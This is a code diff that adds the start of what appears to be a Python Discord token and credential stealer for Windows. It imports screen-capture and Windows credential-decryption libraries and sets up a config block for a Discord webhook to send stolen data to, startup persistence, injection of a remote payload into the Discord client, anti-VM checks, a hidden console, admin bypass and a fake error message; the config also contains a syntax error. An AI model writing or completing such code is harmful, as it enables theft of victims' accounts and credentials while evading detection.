@@ -1,3 +1,32 @@
+import os,json,shutil,base64,sqlite3,zipfile,requests,subprocess,psutil,random,ctypes,sys,re,datetime,time,traceback
+from threading import Thread
+from PIL import ImageGrab
+from win32crypt import CryptUnprotectData
+from Crypto.Cipher import AES
+config = {
+    ### Key: 
+    # Webhook: Webhook to send to discord.
+    # Persist: Add to startup? (True/False, Bool)
+    # Keep-Alive: Keep process running? (Will execute every hour, True/False, Bool)
+    # Injection URL: Raw URL to injection payload
+    # Inject: Inject payload into Discord? (True/False, Bool)
+    # AntiVM: Protect against debuggers? (Recommended, True/False, Bool)
+    # HideConsole: Hide the console? (Similar to PyInstallers -w/--noconsole option, but less detections, (True/False, Bool)
+    # Force Admin: Bypass Admin Privileges? (May not work, True/False, Bool)
+    # Black Screen: Make screen black? (True/False, Bool)
+    # Error Message: Fake error text to display. (Leave Blank for None)
+    'webhook': '',
+    'persist': True,
+    'keep-alive': False,
+    'injection_url': 'url to injection (raw)',
+    'inject': False,
+    'hideconsole': True,
+    'antivm': True,
+    'force_admin': False,
+    'black_screen': False,
+    'error': False
+    'error_message': 'Error message',
+}
 class functions(object):
     def getHeaders(self, token:str=None, content_type="application/json") -> dict:
         headers = {"Content-Type": content_type, "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
